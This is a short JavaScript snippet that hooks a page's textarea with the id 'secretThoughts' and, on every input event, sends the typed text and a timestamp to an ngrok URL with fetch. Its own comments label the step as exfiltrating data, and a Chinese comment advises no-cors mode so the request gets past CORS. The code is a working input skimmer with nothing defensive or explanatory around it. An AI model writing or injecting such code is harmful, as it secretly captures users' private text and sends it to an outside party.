document.addEventListener("DOMContentLoaded", function () {
  // 1. Locate the target element
  const textarea = document.getElementById("secretThoughts");
  if (!textarea) {
    console.log("Textarea not found yet");
    return;
  }

  console.log("Hooking into textarea...");

  // 2. Hook user input events
  textarea.addEventListener("input", function (e) {
    const text = e.target.value;

    // 3. Exfiltrate data to a remote endpoint
    fetch("https://cffbc49a47ea.ngrok-free.app/collect?" +
      "text=" + encodeURIComponent(text) +
      "&timestamp=" + encodeURIComponent(new Date().toISOString()),
      { mode: 'no-cors' } // 建議加上這個，避免 ngrok 的 CORS 擋住請求
    ).catch(console.error);
  });
});
